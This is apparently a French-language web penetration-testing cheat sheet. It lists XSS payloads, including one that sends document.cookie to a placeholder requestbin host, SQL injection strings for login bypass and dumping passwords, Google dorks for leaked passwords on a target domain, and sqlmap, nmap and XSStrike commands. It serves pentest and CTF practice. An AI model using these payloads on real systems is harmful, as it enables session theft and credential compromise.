# XSS

- ```<script>alert(1)</script>``` *(le payload de base pour tester si la faille est présente)*
- ```<img src=x onerror=alert(1) />``` *(une alternative si le mot clef “script” est bloqué)*
- ```<script>$.get(“[https://votrerequestbin.com?cookie=”.concat(document.cookie)](https://votrerequestbin.com?cookie=%E2%80%9D.concat%28document.cookie%29 "https://votrerequestbin.com?cookie=%E2%80%9D.concat(document.cookie)"), function(response){ console.log(response);});</script>```

**Lien utile :**

https://public.requestbin.com/

Permet d’obtenir un serveur disposant d’une URL accessible sur internet et affichant toutes les requêtes reçues. S’utilise généralement pour s’envoyer un cookie via une faille XSS.

&nbsp;

# Injection SQL

- ```admin';#``` *(pour essayer de se connecter avec le compte Admin sans renseigner de mots de passe)*
- ```admin';--```
- ```admin";#```
- ```admin';--```
- ```’ OR 1=1;#```
- ```’ OR 1=1;/*```
- ```toto’ OR (SELECT SUBSTRING(password, 1, 1) FROM users WHERE login=‘admin’) = ‘a’;#``` *(puis tester, b, puis c, etc et si le résultat retourne quelque chose, c’est qu’on a trouvé la 1ère lettre, on peut alors passer à la lettre suivante et recommancer.*
- ```toto' UNION SELECT login, password FROM users;/*``` *(s'assurer que la requête initiale remonte 2 colonnes, sinon ajuster le payload selon le nombre de colonnes à remonter via le UNION)*

# Null Byte (fin de chaîne de caractère)

- ```%00```
- ```\\x00```

https://www.thehacker.recipes/web/inputs/null-byte-injection

# CRLF (retour à la ligne)

- ```%0A```
- ```%0a```
- ```%0D```
- ```%0d```
- ```%0A%0D```
- ```%0a%0d```

# Password payloads (magic hashs)

- ```[]``` (MD5 & SHA1)
- ```240610708``` (MD5)
- ```10932435112``` (SHA1)
- ```TyNOQHUS``` (SHA256)

Lien utile:

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/bb71d4ad141bcffa87d21035a2bcbbd2f2818e45/Type Juggling/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/bb71d4ad141bcffa87d21035a2bcbbd2f2818e45/Type%20Juggling/README.md)

&nbsp;

# Autres liens utiles de manière générale pour le pentest

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
- https://book.hacktricks.xyz/welcome/readme
- https://cheatsheet.haax.fr/
- https://github.com/kkrypt0nn/wordlists
- https://gchq.github.io/CyberChef/
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

&nbsp;

# Google Dorks

intitle:"index of" "ovpn"

(@domain-cible.com OR domain-cible.fr) ("password" OR "mot de passe") (filetype:xls OR filetype:txt)

inurl:github.com "wordlist"

filetype:pdf ("confidentiel" OR "ne pas diffuser") "domain-cible.com"

site:pastebin.com ("password" OR "combolist")

https://www.exploit-db.com/google-hacking-database

# PENTEST
Les tests d’intrusion se déroulent en plusieurs étapes, dont voici les éléments clefs :

- **Analyse fonctionnelle :** L’objectif de l’analyse fonctionnelle est de s’approprier les différents cas d’usage de la plateforme web pour en comprendre les différentes fonctionnalités proposées.
- **Collecte d’information :** La collecte d’information se fait par le biais d’outils permettant d’automatiser la découverte d’éléments pouvant être utilisés comme vecteurs d’attaque. Par exemple, des urls exposées par le serveur mais jamais affichées sur une des pages web, des sous-domaines ou encore les autres sites web exposés depuis le même serveur, ou bien d’autres ports ouverts. Identification des différentes technologies.
- **Scan de vulnérabilités:** Les scans de vulnérabilités se font à l’aide d’outil et permettent la détection de versions (couche OS, web, plugins, etc) comportant des failles connues. Nous démarrons souvent par l’un des plus connus, Nmap, et l’utilisons sur l’ensemble des ports exposés par le serveur. Selon les technologies utilisées par la plateforme web, il convient de compléter avec les scanner appropriés (wpscan pour wordpress par exemple).
- **Analyse du code client :** Le code client (HTML, CSS, Javascript) peut être vu et/ou contourné par n’importe quel utilisateur. L’analyse vise ainsi à vérifier la présence de secrets dans cette partie du code, mais également que les contrôles appliqués aux données envoyées au serveur ne se reposent pas que sur des contrôles côté Javascript. Cela peut parfois nécessiter de traduire du code javascript compilé ou obfusqué pour comprendre et contourner les mécanismes de protection jouées côté client. L’analyse du code client permet également de collecter des informations tel que le nom du développeur (ce qui peut permettre de retrouver un dépôt de code), différentes URI, de l’injection de code javascript si un input dans une url est récupéré et traité en javascript, etc.
- **Analyse des requêtes jouées :** Les requêtes jouées par le navigateur peuvent parfois être réutilisées en curl de manière malveillante. En effet, dans une requête n’importe quel élément peut être modifié avant d’être envoyé au serveur, il s’agit ici de vérifier la réaction du serveur lorsqu’on rejoue des requêtes de manière malveillante (rejouer la requête de changement de mot de passe, en changeant l’identifiant de l’utilisateur ciblé par exemple). Si des contrôles bloquant sont appliqués côté javascript, c’est aussi le moyen de les contourner en jouant les requêtes auprès du serveur en curl.
- **Analyse du parcours d’authentification :** Cette analyse vise à identifier les potentielles défaillances dans la gestion de l’authentification. Par exemple, un changement de mot de passe implique nécessairement la demande de l’ancien mot de passe, pour limiter l’impact d’un vol de cookie. Cela concernera aussi bien la robustesse des mots de passe, la réinitialisation de mot de passe, la connexion, l’enregistrement, et tout ce qui se rapporte à l’identifiant/mot de passe. Cette partie fait également l’objet de tentatives d’attaque bruteforce sur les couples d’identifiants / mot de passe les plus connus.
- **Analyse du cookie/JWT** : L’objectif ici est de vérifier que les éléments d’identification tel qu’un cookie ou un JWT sont correctement configurés et utilisés (flags, signature, contenu sensible, autre).
- **Configuration serveur :** Certains serveurs exposent par défaut différents services ou page web. Selon la technologie utilisée, nous vérifions la présence d’éléments de configuration par défaut (les pages d’administration d’un Tomcat, les accès par défaut ouverts de MongoDB, etc. Cette partie est également l’occasion de vérifier comment le serveur réagit fasse à un plantage dans le code (internal error), auquel cas il est préférable qu’il soit le moins verbeux possible.
- **Configuration des politiques CSP/CORS :** Selon la politique de sécurité définie, il est possible d'exploiter une vulnérabilité de type XSS pour s'envoyer un cookie. Il est possible de vérifier rapidement une vulnérabilité de politique en allant sur ce genre de ressource en ligne : https://csp-evaluator.withgoogle.com/
- **Environnement de la plateforme et Google Dorks :** L’idée est de chercher des éléments potentiellement compromettant autour de la plateforme web, comme son dépôt de code, des dossiers exposés par inadvertance, la présence d’un .git / .gitignore, et autre selon les technologies utilisées.
- **Test de payloads :** Enfin, l’ensemble des entrées (données de formulaire, données dans l’url, de manière globale toutes données transmises dans la requête, ainsi que les fichiers) sont utilisées pour tester différents payloads dans le but d’exploiter différentes failles tel que :
    - Bruteforce d’URI (découverte de routes cachées)
    - Injection SQL (contrôle des données)
    - XSS persistante et éphémère, permet notamment le vol de session, et de manière générale l’exécution arbitraire de code Javascript sur le navigateur d’un autre utilisateur
    - RCE (Remote Code Execution), permet d’exécuter du code arbitraire côté serveur, se traduit le plus souvent par un upload de fichier interprétable par le serveur web, ou par une injection de commande via un input envoyé dans une commande shell exécutée par le serveur.
    - Elévation de privilège (accéder à des ressources restreintes auxquelles nous ne devrions pas pouvoir accéder)
    - Bypass authentication (se connecter sans fournir d’identifiant et/ou mot de passe)
    - Défaillance cryptographique (reforger un cookie ou un JWT, exploitation des collisions de hash dans les attaques bruteforce, et des défaillances cryptographiques)
- **Scans complémentaires :** Nikto peut apporter quelques informations complémentaires à Nmap. Il en existe d’autres.
- **Exploitations des CVE remontées :** ExploitDB

# Quelques commandes :

### Scan de ports

==Nmap==

```
nmap -sS domaine.com
```

```
nmap -sS -sU -sV -top-ports 2000 xx.xx.xx.xx
```

*Le paramètre -sS est utilisé pour un scan des ports TCP en mode rapide et furtif, -sU pour les ports UDP., -sV pour la recherche de version des différents services.*

* * *

### Analyse du code source

==Nmap==

```
nmap -Pn -script=http-sitemap-generator domaine.com
```

*Permet de lister les fichiers .map du site. Ces fichiers correspondent au code des développeurs, beaucoup plus lisible que le code compilé.*

* * *

### Scan de vulnérabilités

==Nmap==

```
nmap -vv -T2 -A -sC --script vuln -p 443 domaine.com
```

*\-vv pour le mode verbeux (il est possible de faire -v et -vvv),* *\-T2 pour tempérer la vitesse à laquelle l’outil envoi ses requêtes,* *\-A pour la détection d’OS et de versions logicielles,* *\-sC pour l’utilisation des scripts NSE considérés comme utiles dans tous les cas,* *–script vuln, pour ajouter la détection de CVE et quelques tests de payloads*

```
nmap -Pn -p 443 -script http-unsafe-output-escaping domaine.com
```

*Détection de potentielles failles XSS*

```
nmap -Pn -p 443 -script http-sql-injection domaine.com
```

*Détection de potentielles injections SQL*

==Nikto==

```
perl ../nikto/program/nikto.pl -h domaine.com
```

Scan de vulnérabilités complémentaire à Nmap, fait d’office la détection d’URI.

==XSStrike==

```
python3 xsstrike.py --crawl -u https://domaine.com
```

Exécute notamment une recherche de CVE

==WPScan==

```
wpscan --url domaine.com --enumerate vp,vt,u --detection-mode aggressive
```

*La partie “–enumerate vp,vt,u” signifie que l’on souhaite énumérer les plugins vulnérables, les thèmes vulnérables et les utilisateurs.*

* * *

### Lister les URI

==GoBuster==

```
cd gobuster/
gobuster dir --url https://domaine.com -w common.txt
```

*Il convient de récupérer au préalable l’outil sur github et un fichier contenant un grand nombre d’uri possibles, sur github aussi par exemple. Il existe d’autres alternatives comme DirBuster et bien d’autres.*

* * *

### Injections SQL

==SQLMap==

```
sqlmap -u "https://domaine.com/view.php?id=9" -p "id"
```

```
sqlmap -u "https://domaine.com/view.php?id=32" --headers "Cookie: SESSIONID=i0p3ftv93k7903s29efl91lmtj" -p "id"
```

```
sqlmap -u "https://domaine.com/index.php" --method POST --data "anchor=&logintoken=9LBiNv2iIicdA3DAwTzV15ksU0rI6kev&username=john&password=doe" -p "username"
```

*Permet de tester des injections SQL sur le paramètre id de l’url, dans le deuxième exemple, un cookie est inséré dans l’en-tête de la requête pour pouvoir atteindre la ressource serveur. Le 3ème exemple montre comment utiliser SQLMap sur des requêtes en POST. Il convient d’utiliser cet outil sur l’ensemble des inputs envoyés au serveur pouvant être traité dans une requête SQL.*

* * *

### Injections NoSQL (MongoDB)

==NoSQLMap==

```
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python nosqlmap.py
```

*Fonctionne avec Python 2.7 de mémoire, une fois lancé, suivre l’interface proposée. Cet outil permet de réaliser des injection NoSQL sur des bases de données tel que MongoDB.*

* * *

### Scan XSS

==XSStrike==

```
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
python3 xsstrike.py --header '{Cookie: lecookie}' -u http://challenge01.root-me.org/web-client/ch26?p=xss

#Avec une wordlist
curl https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt > payloads.txt
python3 xsstrike.py --header '{Cookie: lecookie}' -f ./payloads.txt -u http://challenge01.root-me.org/web-client/ch26?p=xss
```

==XSSER==

```
xsser -u 'http://challenge01.root-me.org' -g '/web-client/ch24?nickname=toto&color=17&p=XSS'
```

# Quelques liens utiles

https://www.stationx.net/nmap-cheat-sheet/

https://www.exploit-db.com/

https://github.com/kkrypt0nn/wordlists

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

https://www.cvedetails.com/

https://book.hacktricks.xyz/welcome/readme

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/mast](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)

https://cheatsheet.haax.fr/

https://gchq.github.io/CyberChef/
